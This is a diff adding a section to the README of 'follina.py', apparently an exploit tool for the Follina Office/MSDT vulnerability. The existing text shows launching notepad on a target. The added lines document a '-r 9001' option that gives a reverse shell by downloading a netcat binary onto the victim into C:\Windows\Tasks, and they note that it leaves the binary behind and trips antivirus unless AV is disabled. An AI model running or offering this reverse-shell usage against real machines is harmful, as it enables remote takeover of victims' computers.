@@ -41,3 +41,10 @@ Pop `notepad.exe`:
 $ python3 follina.py -c "notepad"
 ```
 
+Get a reverse shell on port 9001. **Note, this downloads a netcat binary _onto the victim_ and places it in `C:\Windows\Tasks`. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.**
+
+```
+$ python3 follina.py -r 9001
+```
+
+https://user-images.githubusercontent.com/6288722/171037880-03a73d6a-4606-4c42-abcb-ee52a9e669c6.png
